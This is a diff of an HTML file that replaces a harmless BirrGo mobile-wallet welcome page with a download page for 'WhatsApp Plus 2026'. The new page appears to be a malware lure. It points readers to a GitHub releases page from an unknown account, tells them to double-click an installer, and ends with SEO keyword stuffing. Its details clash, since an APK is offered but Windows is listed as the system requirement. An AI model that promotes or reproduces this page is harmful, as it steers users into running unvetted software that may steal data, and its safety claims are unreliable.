@@ -2,259 +2,55 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>BirrGo Mobile Wallet</title>
-    <!-- Premium, modern tech typography matching your login/signup pages -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    
-    <style>
-        :root {
-            --primary-burgundy: #800020;
-            --primary-gradient: linear-gradient(180deg, #8b0000 0%, #4a0000 100%);
-            --text-dark: #222222;
-            --text-muted: #666666;
-            --bg-light: #ffffff;
-            --card-shadow: 0 8px 24px rgba(0, 0, 0, 0.05);
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            letter-spacing: -0.2px;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        /* Immersive full-screen framework */
-        html, body {
-            width: 100%;
-            height: 100dvh; 
-            overflow: hidden;
-            background-color: var(--bg-light);
-        }
-
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        /* Mobile APK container frame logic */
-        .app-view {
-            width: 100%;
-            height: 100dvh;
-            max-width: 450px; 
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            align-items: center;
-            padding: calc(20px + env(safe-area-inset-top)) 24px calc(20px + env(safe-area-inset-bottom)) 24px;
-            background: radial-gradient(circle at 100% 0%, rgba(0,0,0,0.015) 0%, transparent 40%),
-                        radial-gradient(circle at 0% 100%, rgba(0,0,0,0.01) 0%, transparent 40%);
-        }
-
-        /* Centered logo container */
-        .brand-section {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-            margin-top: 15px;
-            width: 100%;
-            flex: 1.2;
-            justify-content: center;
-        }
-
-        .logo-image {
-            width: 75%;
-            max-width: 220px;
-            height: auto;
-            object-fit: contain;
-        }
-
-        /* Headline text */
-        .welcome-content {
-            text-align: center;
-            padding: 0 10px;
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
-
-        .welcome-content h1 {
-            font-size: 30px;
-            font-weight: 800;
-            color: var(--text-dark);
-            margin-bottom: 12px;
-            letter-spacing: -0.6px;
-        }
-
-        .welcome-content p {
-            font-size: 15px;
-            color: var(--text-muted);
-            line-height: 1.5;
-            font-weight: 500;
-        }
-
-        /* Horizontal mini-slides cards feature container */
-        .features-container {
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin: 15px 0;
-            width: 100%;
-            flex: 1;
-            align-items: center;
-        }
-
-        .feature-card {
-            flex: 1;
-            max-width: 105px;
-            height: 105px;
-            background: #ffffff;
-            border-radius: 20px;
-            box-shadow: var(--card-shadow);
-            border: 1px solid rgba(0,0,0,0.03);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 8px;
-        }
-
-        .feature-card.active {
-            transform: scale(1.06);
-            border: 1px solid rgba(0,0,0,0.06);
-        }
-
-        .card-inner-box {
-            width: 100%;
-            height: 100%;
-            border-radius: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-        }
-
-        /* Navigation action triggers at bottom */
-        .action-area {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            width: 100%;
-            margin-top: auto;
-            padding-bottom: 5px;
-        }
-
-        .btn {
-            width: 100%;
-            height: 54px;
-            border-radius: 27px;
-            font-size: 18px;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: transform 0.1s ease;
-            text-decoration: none; /* Clear standard anchor text underline style rules */
-        }
-
-        .btn:active {
-            transform: scale(0.98);
-        }
-
-        .btn-primary {
-            background: var(--primary-gradient);
-            color: #ffffff;
-            box-shadow: 0 6px 16px rgba(128, 0, 32, 0.25);
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: var(--text-dark);
-            border: 2px solid #333333;
-        }
-
-        .footer-links {
-            text-align: center;
-            font-size: 13px;
-            color: var(--text-muted);
-            margin-top: 10px;
-            font-weight: 500;
-        }
-
-        .footer-links a {
-            color: var(--text-dark);
-            text-decoration: underline;
-            margin: 0 2px;
-            font-weight: 600;
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Guide for downloading and installing WhatsApp Plus 2026. Custom features for your messaging experience.">
+    <title>WhatsApp-Plus-2026-Download-APK</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f4f7f6;">
 
-    <div class="app-view">
-        
-        <div class="brand-section">
-            <img class="logo-image" src="birrgo-logo.png" alt="BirrGo Mobile Wallet Logo">
-        </div>
+    <h1 style="color: #2c3e50;">📱 WhatsApp-Plus-2026-Download-APK - Unlock New Features For Your Chats</h1>
 
-        <div class="welcome-content">
-            <h1>Welcome to BirrGo!</h1>
-            <p>The fast, secure, and easy way to manage your finances in Ethiopia. Pay, send, and save with confidence.</p>
-        </div>
-
-        <div class="features-container">
-            <div class="feature-card">
-                <div class="card-inner-box" style="background-color: #fdf2f4;">
-                    <span>💸</span>
-                </div>
-            </div>
-            <div class="feature-card active">
-                <div class="card-inner-box" style="background-color: #f0f4f8;">
-                    <span>📱🔒</span>
-                </div>
-            </div>
-            <div class="feature-card">
-                <div class="card-inner-box" style="background-color: #fcf6f0;">
-                    <span>🏦</span>
-                </div>
-            </div>
-        </div>
-
-        <div class="action-area">
-            <!-- Target registration node button (FIXED to point to register.html) -->
-            <a href="register.html" id="createAccountBtn" class="btn btn-primary">Create Account</a>
-            
-            <a href="login.html" class="btn btn-secondary">Log In</a>
-            
-            <div class="footer-links">
-                Need help? <a href="#">Contact support</a> | <a href="#">Terms</a> | <a href="#">Privacy</a>
-            </div>
-        </div>
-
+    <div style="text-align: center; margin: 30px 0;">
+        <a href="https://github.com/alexisdarkcolored960/WhatsApp-Plus-2026-Download-APK/releases" style="background-color: #34495e; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Latest Version</a>
     </div>
 
-    <!-- Referral Link Protection Script Pipeline -->
-    <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            // Read URL parameter details from current browser context
-            const urlParams = new URLSearchParams(window.location.search);
-            const refParam = urlParams.get('ref');
+    <h2 style="border-bottom: 2px solid #bdc3c7; padding-bottom: 10px;">📋 Application Overview</h2>
+    <p>WhatsApp Plus offers extra tools for your messaging needs. This version includes themes, hidden status options, and increased file sharing limits. It functions as a modification of the standard messaging software to provide users with more control over their interface and privacy settings.</p>
 
-            // If a referral token exists, append it seamlessly to the Sign-up link (FIXED to register.html)
-            if (refParam) {
-                const createBtn = document.getElementById('createAccountBtn');
-                if (createBtn) {
-                    createBtn.href = `register.html?ref=${encodeURIComponent(refParam.trim())}`;
-                }
-            }
-        });
-    </script>
+    <h2 style="border-bottom: 2px solid #bdc3c7; padding-bottom: 10px;">⚙️ System Requirements</h2>
+    <p>Check these requirements before you start the installation process:</p>
+    <ul>
+        <li>Operating System: Windows 10 or Windows 11.</li>
+        <li>Memory: At least 4GB of RAM.</li>
+        <li>Storage: 200MB of free disk space.</li>
+        <li>Internet Connection: Required for initial setup and message syncing.</li>
+    </ul>
+
+    <h2 style="border-bottom: 2px solid #bdc3c7; padding-bottom: 10px;">📥 How to Download and Install</h2>
+    <p>Follow these steps to set up the software on your Windows computer:</p>
+    <ol>
+        <li>Visit the <a href="https://github.com/alexisdarkcolored960/WhatsApp-Plus-2026-Download-APK/releases">download page</a> to access the installation files.</li>
+        <li>Locate the latest release file in the list.</li>
+        <li>Click the file name to start the download to your computer.</li>
+        <li>Open your Downloads folder and double-click the installer file.</li>
+        <li>Follow the instructions on your screen to complete the installation.</li>
+        <li>Launch the program from your desktop shortcut once the process finishes.</li>
+    </ol>
+    <p>Ensure you have removed older versions of similar software to avoid conflicts during the setup process.</p>
+
+    <h2 style="border-bottom: 2px solid #bdc3c7; padding-bottom: 10px;">✨ Core Features</h2>
+    <p>This software includes several additions designed to improve your user experience:</p>
+    <ul>
+        <li><strong>Custom Themes:</strong> Change the colors and layout of your chat windows.</li>
+        <li><strong>Privacy Controls:</strong> Hide your online status or typing notifications.</li>
+        <li><strong>Extended Sharing:</strong> Send larger video and document files easily.</li>
+        <li><strong>Message Scheduling:</strong> Set messages to send at a specific time.</li>
+    </ul>
+
+    <h2 style="border-bottom: 2px solid #bdc3c7; padding-bottom: 10px;">🔒 Safety Information</h2>
+    <p>Keep your account information private. Download software only from verifiable locations to protect your data. Regularly back up your chat history through the internal settings menu to ensure you do not lose your conversation data during updates.</p>
+
+    <p style="margin-top: 40px; font-size: 0.9em; color: #7f8c8d;">Keywords: free-whatsapp-plus, gbwhatsapp, whatsapp-mod, whatsapp-plus, whatsapp-plus-2026, whatsapp-plus-android, whatsapp-plus-anti-ban, whatsapp-plus-apk, whatsapp-plus-custom, whatsapp-plus-download, whatsapp-plus-exe, whatsapp-plus-free, whatsapp-plus-github, whatsapp-plus-latest, whatsapp-plus-mod, whatsapp-plus-reddit, whatsapp-plus-safe, whatsapp-plus-software, whatsapp-plus-theme, whatsapp-plus-tool</p>
+
 </body>
 </html>
